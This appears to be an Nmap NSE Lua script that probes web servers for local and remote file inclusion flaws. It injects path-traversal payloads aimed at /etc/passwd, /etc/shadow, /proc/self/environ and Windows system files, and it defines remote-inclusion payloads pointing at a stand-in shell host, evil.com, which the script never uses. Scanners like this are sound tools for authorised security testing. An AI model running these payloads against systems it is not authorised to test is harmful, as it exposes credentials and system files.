-- File Inclusion Detection
-- Tests for LFI and RFI vulnerabilities

local http = require("http")
local stdnse = require("stdnse")

description = [[
Tests for Local File Inclusion (LFI) and Remote File Inclusion (RFI)
vulnerabilities by injecting file path and URL payloads into parameters.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or
            port.number == 8080)
end

action = function(host, port)
    local output = {}
    local findings = {}

    local lfi_payloads = {
        "/etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "C:\\windows\\win.ini",
        "C:\\boot.ini",
    }

    local rfi_payloads = {
        "http://evil.com/shell.txt",
        "http://evil.com/shell.txt?",
        "http://evil.com/shell.txt%00",
    }

    local params = {"file", "path", "page", "include", "doc", "template", "load", "inc"}
    local test_paths = {"/index.php", "/main.php", "/page.php", "/include.php"}

    for _, test_path in ipairs(test_paths) do
        for _, param in ipairs(params) do
            for _, payload in ipairs(lfi_payloads) do
                local url = test_path .. "?" .. param .. "=" .. payload
                local r = http.get(host.ip, port, url)
                if r and r.body then
                    if r.body:find("root:%w*:0:0") or r.body:find("daemon:") then
                        table.insert(findings, "LFI: " .. url)
                        break
                    end
                end
            end
        end
    end

    if #findings > 0 then
        table.insert(output, "File Inclusion Vulnerabilities Found:")
        table.insert(output, "")
        for _, f in ipairs(findings) do
            table.insert(output, "[!] " .. f)
        end
        table.insert(output, "")
        table.insert(output, "[!] CRITICAL: Allows file inclusion and potential RCE")
        return stdnse.format_output(true, output)
    end

    return nil
end
